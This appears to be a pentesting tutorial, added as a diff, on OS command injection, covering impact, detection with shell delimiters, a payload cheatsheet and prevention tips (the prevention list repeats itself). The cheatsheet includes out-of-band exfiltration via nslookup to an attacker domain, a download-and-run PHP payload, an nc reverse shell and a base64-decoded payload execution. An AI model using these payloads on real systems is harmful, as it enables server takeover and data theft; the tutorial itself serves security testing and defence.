@@ -1,0 +1,92 @@
+What’s the Impact of Command Injection
+
+With this vulnerability, an attacker can run operating system commands with the privileges of the vulnerable application. 
+Depending on the privileges of the current user, this vulnerability can result in getting access to the system, exfiltrating critically sensitive data, 
+and can lead to a full control takeover of the server or systems.
+
+How to Detect and Exploit Them?
+
+Imagine you are testing the parameters of the following URL during a pentest:
+
+https://vulnerable-website/endpoint?parameter=123 
+
+To detect if the source code is not protecting against command injection, we can try a couple of methods:
+Insert special characters to detect Delimiter:
+
+We can inject some special characters to see if the application blocks anything that could be used for command injection:
+
+&
+;
+Newline (0x0a or \n)
+&&
+|
+||
+
+In case the application doesn’t throw any error messages, we can try injecting our command after using one of these delimiters.
+
+https://vulnerable-website/endpoint?parameter=1|whoami
+
+Command Injection Cheatsheet
+
+--------------------------------------------------------------------
+Special Characters
+&
+;
+Newline (0x0a or \n)
+&&
+|
+||
+command `
+$(command )
+--------------------------------------------------------------------
+Useful Commands: Linux
+whoami
+ifconfig
+ls
+uname -a
+--------------------------------------------------------------------
+Useful Commands: Windows
+whoami
+ipconfig
+dir
+ver
+--------------------------------------------------------------------
+Both Unix and Windows supported
+ls||id; ls ||id; ls|| id; ls || id 
+ls|id; ls |id; ls| id; ls | id 
+ls&&id; ls &&id; ls&& id; ls && id 
+ls&id; ls &id; ls& id; ls & id 
+ls %0A id
+--------------------------------------------------------------------
+Time Delay Commands
+& ping -c 10 127.0.0.1 &
+--------------------------------------------------------------------
+Redirecting output
+& whoami > /var/www/images/output.txt &
+--------------------------------------------------------------------
+OOB (Out Of Band) Exploitation
+& nslookup attacker-server.com &
+& nslookup `whoami`.attacker-server.com &
+-------------------------------------------------------------------
+WAF bypasses
+vuln=127.0.0.1 %0a wget https://evil.txt/reverse.txt -O 
+/tmp/reverse.php %0a php /tmp/reverse.php
+vuln=127.0.0.1%0anohup nc -e /bin/bash <attacker-ip> <attacker-port>
+vuln=echo PAYLOAD > /tmp/payload.txt; cat /tmp/payload.txt | base64 -d > /tmp/payload; chmod 744 /tmp/payload; /tmp/payload
+--------------------------------------------------------------------
+
+For more payloads, you can check out the following injection payload lists. - https://github.com/payloadbox/command-injection-payload-list
+
+How to prevent it?
+
+There are many ways to prevent this vulnerability. Couple of suggestions can be listed as below:
+
+    Avoid using shell execution functions. If unavoidable, limit their use to very specific use cases.
+    Perform proper input validation when taking user input into a shell execution command.
+    Use a safe API when accepting user input into the application.
+    Escape special characters in the case where a safe API is not available.
+    Avoid using shell execution functions. If unavoidable, limit their use to very specific use cases.
+    Perform proper input validation when taking user input into a shell execution command.
+    Use a safe API when accepting user input into the application.
+    Escape special characters in the case where a safe API is not available.
+
